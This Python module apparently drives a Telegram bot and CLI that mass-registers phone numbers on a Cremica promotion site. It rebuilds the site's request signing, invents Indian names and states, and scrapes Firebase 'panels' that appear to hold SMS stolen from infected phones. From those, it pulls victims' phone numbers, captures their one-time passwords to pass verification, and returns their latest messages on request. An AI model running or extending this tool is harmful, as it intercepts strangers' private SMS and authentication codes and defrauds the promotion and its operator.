#!/usr/bin/env python3
"""
Cremica School Shuru Automation - Core Module for Telegram Bot & CLI.
Handles payload encryption, Firebase OTP polling, session management, and API calls.
"""

import json
import base64
import time
import hmac
import hashlib
import random
import string
import requests
import re
import os
import threading
from urllib.parse import urlparse, parse_qs
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE_URL = "https://cremicabacktoschool.woohoo.in"

DEFAULT_HEADERS = {
    "Accept": "*/*",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-alive",
    "Origin": BASE_URL,
    "Referer": BASE_URL + "/",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36"
    ),
}

INDIAN_FIRST_NAMES = [
    "Aarav", "Vivaan", "Aditya", "Vihaan", "Arjun", "Sai", "Pranav", "Dhruv",
    "Krishna", "Shaurya", "Aryan", "Ananya", "Diya", "Ishita", "Myra", "Sara",
    "Anaya", "Aadhya", "Riya", "Kavya", "Priya", "Neha", "Rohan", "Amit",
    "Rahul", "Vikram", "Karan", "Raj", "Sneha", "Pooja", "Meera", "Nisha",
]
INDIAN_LAST_NAMES = [
    "Sharma", "Verma", "Patel", "Singh", "Kumar", "Gupta", "Joshi", "Rao",
    "Reddy", "Nair", "Menon", "Iyer", "Pillai", "Shah", "Desai", "Bhatt",
    "Agarwal", "Khanna", "Mehta", "Choudhury", "Saxena", "Malhotra",
]
STATES = [
    "Punjab", "Uttar Pradesh", "Haryana", "Rajasthan", "Karnataka",
    "Himachal Pradesh", "Jammu and Kashmir", "Delhi", "Uttarakhand",
    "Bihar", "Maharashtra", "Madhya Pradesh", "Assam", "Kerala",
    "West Bengal", "Gujarat", "Telangana", "Ladakh", "Chandigarh",
]
NL = "\n"


def random_indian_name():
    return random.choice(INDIAN_FIRST_NAMES) + " " + random.choice(INDIAN_LAST_NAMES)


def random_state():
    return random.choice(STATES)


def encrypt_payload(payload, user_key, data_key):
    payload_with_ts = payload.copy()
    payload_with_ts["userKey"] = user_key
    payload_with_ts["t"] = int(time.time() * 1000)
    json_str = json.dumps(payload_with_ts, separators=(",", ":"))
    s = base64.b64encode(json_str.encode("utf-8")).decode("utf-8")
    t = payload_with_ts["t"]
    u = base64.b64encode(str(t).encode("utf-8")).decode("utf-8")
    hmac_key = data_key[4:18]
    hmac_input = u + "." + s
    dig = hmac.new(
        hmac_key.encode("utf-8"),
        hmac_input.encode("utf-8"),
        hashlib.sha256,
    ).hexdigest()
    fx = base64.b64encode(dig.encode("utf-8")).decode("utf-8")
    rand_h = random.randint(1, 6)
    rand_p = random.randint(2, 8)
    m = "".join(random.choices(string.ascii_letters + string.digits, k=rand_p))
    return (
        u + "." + s + "." + str(rand_p) + str(rand_h)
        + fx[:rand_h] + m + fx[rand_h:]
    )


def decode_response(json_resp):
    if "resp" in json_resp:
        decoded = base64.b64decode(json_resp["resp"]).decode("utf-8")
        return json.loads(decoded)
    return json_resp


def send_request(endpoint, user_key, data_key, payload,
                 method="POST", access_token=None, session=None):
    url = BASE_URL + "/api/" + endpoint + str(user_key)
    data = encrypt_payload(payload, user_key, data_key)
    form = {"userKey": user_key, "data": data}
    headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
    headers.update(DEFAULT_HEADERS)
    if access_token:
        headers["Authorization"] = "Bearer " + access_token
    sess = session if session else requests.Session()
    resp = sess.request(method, url, data=form, headers=headers)
    resp.raise_for_status()
    json_resp = resp.json()
    decoded = decode_response(json_resp)
    if decoded.get("statusCode") != 200:
        raise Exception("API error: " + str(decoded))
    return decoded


def create_user(session=None):
    url = BASE_URL + "/api/users"
    headers = {"Accept": "application/json", "Content-Type": "application/json"}
    headers.update(DEFAULT_HEADERS)
    sess = session if session else requests.Session()
    resp = sess.post(url, json={}, headers=headers)
    resp.raise_for_status()
    json_resp = resp.json()
    decoded = decode_response(json_resp)
    if decoded.get("statusCode") != 200:
        raise Exception("Create user failed: " + str(decoded))
    return decoded


def track_click(user_key, data_key, session=None):
    return send_request("users/clickTrack/", user_key, data_key,
                        {"type": "GET_STARTED"}, session=session)


def register(user_key, data_key, name, mobile, session=None):
    return send_request("users/register/", user_key, data_key,
                        {"name": name, "mobile": mobile}, session=session)


def verify_otp(user_key, data_key, otp, session=None):
    result = send_request("users/verifyOTP/", user_key, data_key,
                          {"otp": otp}, session=session)
    return result.get("accessToken")


def get_batch_code(user_key, data_key, access_token, batch_code, state, session=None):
    return send_request("users/getBatchCode/", user_key, data_key,
                        {"batchCode": batch_code, "state": state},
                        access_token=access_token, session=session)


# ----------------------------------------------------------------------
# Firebase Helpers (Enhanced & Universal)
def parse_firebase_link(link):
    if not link:
        return None
    link = link.strip()
    if not link.startswith(("http://", "https://")):
        link = "https://" + link

    # Check if there is an 's=' base64 query param
    parsed = urlparse(link)
    qs = parse_qs(parsed.query)
    encoded_s = qs.get("s", [None])[0]
    if encoded_s:
        try:
            encoded_clean = encoded_s + "=" * (-len(encoded_s) % 4)
            decoded = base64.b64decode(encoded_clean).decode("utf-8", errors="ignore").split("|")[0].strip()
            if "firebaseio.com" in decoded or "firebasedatabase.app" in decoded:
                if not decoded.startswith(("http://", "https://")):
                    decoded = "https://" + decoded
                return decoded.rstrip("/") + "/"
        except Exception:
            pass

    # Direct match for Firebase RTDB domain
    if "firebaseio.com" in link or "firebasedatabase.app" in link:
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        return base_url.rstrip("/") + "/"

    return None


def is_online_device(data):
    if not isinstance(data, dict):
        return False
    for key in ("status", "state", "online", "isOnline", "connected", "isConnected", "active"):
        value = data.get(key)
        if value is True or value == 1:
            return True
        if isinstance(value, str) and value.strip().lower() in {
            "true", "online", "connected", "active", "ready"
        }:
            return True
    return False


def extract_phone_from_messages(device_messages):
    patterns = [
        (re.compile(r"\b(?:\+91|91|0)?([6-9]\d{9})\b"), 10),
        (re.compile(r"\b(?:phone|mobile|number|num|sender)[\s:]*([6-9]\d{9})\b", re.IGNORECASE), 15),
        (re.compile(r"[^0-9]([6-9]\d{9})[^0-9]"), 5),
    ]
    counts = {}
    if isinstance(device_messages, dict):
        msg_iter = device_messages.values()
    elif isinstance(device_messages, list):
        msg_iter = device_messages
    else:
        return None

    for msg in msg_iter:
        if isinstance(msg, str):
            text = msg
        elif isinstance(msg, dict):
            text = str(msg.get("body") or msg.get("message") or msg.get("text") or msg.get("address") or msg.get("sender") or "")
        else:
            continue

        for pattern, score in patterns:
            for number in pattern.findall(text):
                counts[number] = counts.get(number, 0) + score
    if not counts:
        return None
    return max(counts, key=counts.get)


def extract_otp_from_messages(device_messages, trigger_time_ms=None):
    if isinstance(device_messages, dict):
        items = list(device_messages.items())
        try:
            items.sort(key=lambda x: int(x[0]), reverse=True)
        except Exception:
            pass
    elif isinstance(device_messages, list):
        items = list(enumerate(reversed(device_messages)))
    else:
        return None

    for msg_id, msg_data in items:
        if isinstance(msg_data, dict):
            body = str(msg_data.get("body") or msg_data.get("message") or msg_data.get("text") or "")
        elif isinstance(msg_data, str):
            body = msg_data
        else:
            continue

        if not body:
            continue

        matches = re.findall(r"(?<!\d)(\d{4}|\d{6})(?!\d)", body)
        if matches:
            for m in matches:
                if m in ("2024", "2025", "2026", "2027"):
                    continue
                return m
    return None


def fetch_devices_and_phones(firebase_url):
    clients_data = {}
    messages_data = {}

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json",
    }

    def fetch_node(endpoint):
        try:
            url = firebase_url.rstrip("/") + f"/{endpoint}.json"
            resp = requests.get(url, headers=headers, timeout=8)
            if resp.status_code == 200:
                return resp.json() or {}
        except Exception as e:
            print(f"  [WARN] Error fetching {endpoint}.json: {e}")
        return {}

    # Fetch clients.json and messages.json in parallel
    with ThreadPoolExecutor(max_workers=2) as executor:
        f_messages = executor.submit(fetch_node, "messages")
        f_clients = executor.submit(fetch_node, "clients")
        messages_data = f_messages.result()
        clients_data = f_clients.result()

    seen_phones = set()
    result = []

    # Strategy 1: Check clients_data if available
    if isinstance(clients_data, dict) and clients_data:
        for c_id, c_data in clients_data.items():
            if is_online_device(c_data):
                device_msgs = messages_data.get(str(c_id), {}) if isinstance(messages_data, dict) else {}
                phone = extract_phone_from_messages(device_msgs)
                if phone and phone not in seen_phones:
                    seen_phones.add(phone)
                    result.append({"client_id": str(c_id), "phone": phone})

    # Strategy 2: If no online devices found via clients.json, search all client keys in messages_data
    if not result and isinstance(messages_data, dict) and messages_data:
        for c_id, device_msgs in messages_data.items():
            phone = extract_phone_from_messages(device_msgs)
            if phone and phone not in seen_phones:
                seen_phones.add(phone)
                result.append({"client_id": str(c_id), "phone": phone})

    return result


def poll_for_otp(firebase_url, client_id, trigger_time_ms, attempts=12, interval=2.5):
    for attempt in range(attempts):
        time.sleep(interval)
        try:
            m_req = requests.get(
                firebase_url.rstrip("/") + f"/messages/{client_id}.json", timeout=10
            )
            messages = m_req.json() if m_req.status_code == 200 else None
            if not messages:
                m_req = requests.get(firebase_url.rstrip("/") + "/messages.json", timeout=10)
                all_msgs = m_req.json() if m_req.status_code == 200 else {}
                if isinstance(all_msgs, dict):
                    messages = all_msgs.get(str(client_id))

            if messages:
                otp = extract_otp_from_messages(messages, trigger_time_ms)
                if otp:
                    return otp
        except Exception as e:
            print(f"  [DEBUG] OTP poll attempt {attempt+1} error: {e}")
            continue
    return None


# ----------------------------------------------------------------------
# Result Logging
LOG_FILE = "cremica_results.txt"
_log_lock = threading.Lock()
CSV_HEADER = "phone,name,state,batch_code,status,details,timestamp"


def log_result(phone, name, state, batch_code, status, details=""):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with _log_lock:
        needs_header = not os.path.exists(LOG_FILE)
        safe_name = name.replace(",", " ")
        safe_state = state.replace(",", " ")
        safe_details = str(details).replace(",", " ")
        with open(LOG_FILE, "a", encoding="utf-8") as fh:
            if needs_header:
                fh.write(CSV_HEADER + NL)
            fh.write(
                f"{phone},{safe_name},{safe_state},{batch_code},{status},{safe_details},{timestamp}{NL}"
            )


def write_summary_report(results, batch_code="CD06G26", log_file=LOG_FILE):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    successes = [r for r in results if r.get("status") == "success"]
    failures = [r for r in results if r.get("status") != "success"]

    lines = []
    lines.append("=" * 80)
    lines.append("                     CREMICA CAMPAIGN EXECUTION REPORT")
    lines.append("=" * 80)
    lines.append(f"Timestamp: {timestamp}")
    lines.append(f"Batch Code: {batch_code}")
    lines.append(f"Total Processed: {len(results)} | Successes: {len(successes)} | Failures: {len(failures)}")
    lines.append("")

    lines.append("=" * 80)
    lines.append(f"✅ SUCCESSFUL REGISTRATIONS ({len(successes)})")
    lines.append("=" * 80)
    
    succ_json_list = []
    if successes:
        for idx, item in enumerate(successes, 1):
            phone = item.get("phone", "")
            name = item.get("name", "")
            state = item.get("state", "")
            details = item.get("details", "Complete")
            fb_url = item.get("firebase_url") or item.get("panel_url") or "N/A"
            cid = item.get("client_id") or "N/A"
            lines.append(f"{idx}. Phone: {phone} | Panel: {fb_url} | Device ID: {cid} | Name: {name} | Details: {details}")
            succ_json_list.append({
                "phone": phone,
                "panel_url": fb_url,
                "client_id": cid,
                "name": name,
                "timestamp": timestamp
            })
    else:
        lines.append("No successful registrations in this run.")

    lines.append("")
    lines.append("=" * 80)
    lines.append(f"❌ FAILED REGISTRATIONS ({len(failures)})")
    lines.append("=" * 80)
    if failures:
        for idx, item in enumerate(failures, 1):
            phone = item.get("phone", "")
            name = item.get("name", "")
            state = item.get("state", "")
            status = item.get("status", "Failed")
            details = item.get("details", "")
            lines.append(f"{idx}. Phone: {phone} | Name: {name} | State: {state} | Status: {status} | Reason: {details}")
    else:
        lines.append("No failed registrations in this run.")

    lines.append("=" * 80)
    content = NL.join(lines) + NL

    with _log_lock:
        with open(log_file, "w", encoding="utf-8") as fh:
            fh.write(content)

        # Also write/append to successful_participated_devices.json
        if succ_json_list:
            json_file = "successful_participated_devices.json"
            existing = []
            if os.path.exists(json_file):
                try:
                    with open(json_file, "r", encoding="utf-8") as jf:
                        existing = json.load(jf)
                except Exception:
                    existing = []
            
            phone_set = {x.get("phone") for x in existing if isinstance(x, dict)}
            for sitem in succ_json_list:
                if sitem["phone"] not in phone_set:
                    existing.append(sitem)
                    phone_set.add(sitem["phone"])

            with open(json_file, "w", encoding="utf-8") as jf:
                json.dump(existing, jf, indent=2)

    return content


# ----------------------------------------------------------------------
# Single Number Execution
def process_number(phone, name, state, batch_code,
                   firebase_url=None, client_id=None,
                   otp_override=None, session=None):
    try:
        user_data = create_user(session)
    except Exception as e:
        log_result(phone, name, state, batch_code, "session_failed", str(e))
        return {"status": "session_failed", "details": str(e)}

    user_key = user_data["userKey"]
    data_key = user_data["dataKey"]

    try:
        track_click(user_key, data_key, session)
    except Exception:
        pass

    try:
        register(user_key, data_key, name, phone, session)
    except Exception as e:
        log_result(phone, name, state, batch_code, "register_failed", str(e))
        return {"status": "register_failed", "details": str(e)}

    otp = otp_override
    if not otp and firebase_url and client_id:
        trigger_time_ms = int(time.time() * 1000)
        otp = poll_for_otp(firebase_url, client_id, trigger_time_ms)
        if not otp:
            log_result(phone, name, state, batch_code, "otp_timeout",
                       "Firebase no OTP within 30s")
            return {"status": "otp_timeout", "details": "No OTP from Firebase"}

    if not otp or len(otp) not in (4, 6):
        log_result(phone, name, state, batch_code, "otp_invalid", "Invalid OTP format")
        return {"status": "otp_invalid", "details": "Invalid OTP format"}

    try:
        access_token = verify_otp(user_key, data_key, otp, session)
    except Exception as e:
        log_result(phone, name, state, batch_code, "verify_failed", str(e))
        return {"status": "verify_failed", "details": str(e)}

    try:
        get_batch_code(user_key, data_key, access_token, batch_code, state, session)
        log_result(phone, name, state, batch_code, "success", "Batch code validated")
        return {"status": "success", "details": "Registration complete"}
    except Exception as e:
        log_result(phone, name, state, batch_code, "batch_failed", str(e))
        return {"status": "batch_failed", "details": str(e)}


# ----------------------------------------------------------------------
# Parallel Execution Engine with Optional Progress Callbacks
def process_numbers_parallel(jobs, batch_code, max_workers=5, progress_callback=None):
    results = []
    total_success = 0
    processed_phones = set()
    processed_lock = threading.Lock()
    total_jobs = len(jobs)
    completed_count = 0

    def worker(job):
        nonlocal completed_count, total_success
        phone, name, state, fb_url, client_id = job
        with processed_lock:
            if phone in processed_phones:
                return None
            processed_phones.add(phone)
        session = requests.Session()
        try:
            result = process_number(
                phone, name, state, batch_code,
                firebase_url=fb_url, client_id=client_id,
                session=session,
            )
            outcome = (phone, name, state, result)
            with processed_lock:
                completed_count += 1
                if result["status"] == "success":
                    total_success += 1
                if progress_callback:
                    try:
                        progress_callback(completed_count, total_jobs, outcome)
                    except Exception:
                        pass
            return outcome
        finally:
            session.close()

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_job = {executor.submit(worker, job): job for job in jobs}
        for future in as_completed(future_to_job):
            try:
                outcome = future.result()
                if outcome is None:
                    continue
                p, n, st, result = outcome
                results.append({"phone": p, "name": n, "state": st, **result})
            except Exception as e:
                print(f"[WARN] Worker error: {e}")

    return total_success, results


# ----------------------------------------------------------------------
# Fast Telegram / Standalone OTP Fetcher Helper
def fetch_otp_for_phone(phone_input):
    clean_phone = "".join(filter(str.isdigit, str(phone_input)))
    if len(clean_phone) > 10 and clean_phone.startswith("91"):
        clean_phone = clean_phone[2:]

    if len(clean_phone) != 10:
        return {"status": "error", "message": "Invalid 10-digit phone number", "phone": clean_phone}

    device_index_file = "device_index.json"
    device_index = {}
    if os.path.exists(device_index_file):
        try:
            with open(device_index_file, "r", encoding="utf-8") as jf:
                device_index = json.load(jf)
        except Exception:
            device_index = {}

    info = device_index.get(clean_phone)
    panel_url = info.get("panel_url") if isinstance(info, dict) else None
    client_id = info.get("client_id") if isinstance(info, dict) else None

    # If unmapped, perform quick scan across panels.txt
    if not panel_url or not client_id:
        panel_urls = []
        if os.path.exists("panels.txt"):
            with open("panels.txt", "r", encoding="utf-8") as f:
                for line in f:
                    p = parse_firebase_link(line)
                    if p:
                        panel_urls.append(p)

        headers = {"User-Agent": "Mozilla/5.0", "Accept": "application/json"}

        def scan_panel(p_url):
            try:
                resp = requests.get(f"{p_url.rstrip('/')}/messages.json", headers=headers, timeout=6)
                if resp.status_code == 200:
                    data = resp.json() or {}
                    if isinstance(data, dict):
                        for cid, device_msgs in data.items():
                            if isinstance(device_msgs, dict):
                                for m in device_msgs.values():
                                    if isinstance(m, dict):
                                        t = str(m.get("body") or m.get("message") or m.get("text") or "")
                                        if clean_phone in t:
                                            return p_url, cid
            except Exception:
                pass
            return None, None

        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(scan_panel, u) for u in panel_urls]
            for f in as_completed(futures):
                p_u, c_i = f.result()
                if p_u and c_i:
                    panel_url = p_u
                    client_id = c_i
                    # Save mapping for future 50ms direct lookup
                    device_index[clean_phone] = {"panel_url": panel_url, "client_id": client_id}
                    try:
                        with open(device_index_file, "w", encoding="utf-8") as jf:
                            json.dump(device_index, jf, indent=2)
                    except Exception:
                        pass
                    break

    if not panel_url or not client_id:
        return {"status": "not_found", "message": f"Phone {clean_phone} not found on any panel", "phone": clean_phone}

    # Fetch messages from direct endpoint
    try:
        url = f"{panel_url.rstrip('/')}/messages/{client_id}.json"
        headers = {"User-Agent": "Mozilla/5.0", "Accept": "application/json"}
        resp = requests.get(url, headers=headers, timeout=6)
        if resp.status_code == 200:
            data = resp.json() or {}
            messages = []
            if isinstance(data, dict):
                for mid, mdata in data.items():
                    if isinstance(mdata, dict):
                        body = str(mdata.get("body") or mdata.get("message") or mdata.get("text") or "")
                        if not body:
                            continue
                        sender = str(mdata.get("sender") or mdata.get("address") or mdata.get("from") or "Unknown")
                        ts_val = 0
                        ts_str = "Unknown"
                        try:
                            ts_val = int(mid) / 1000
                            ts_str = datetime.fromtimestamp(ts_val).strftime("%Y-%m-%d %H:%M:%S")
                        except Exception:
                            pass

                        otp_match = re.search(r"(?<!\d)(\d{4}|\d{6})(?!\d)", body)
                        otp = otp_match.group(1) if otp_match else "N/A"

                        messages.append({
                            "msg_id": mid,
                            "sender": sender,
                            "body": body,
                            "otp": otp,
                            "time": ts_str,
                            "ts_val": ts_val
                        })

            messages.sort(key=lambda x: (x["ts_val"], str(x["msg_id"])), reverse=True)
            return {
                "status": "success",
                "phone": clean_phone,
                "panel_url": panel_url,
                "client_id": client_id,
                "messages": messages[:3]
            }
    except Exception as e:
        return {"status": "error", "message": str(e), "phone": clean_phone}

    return {"status": "error", "message": "Failed to fetch messages", "phone": clean_phone}

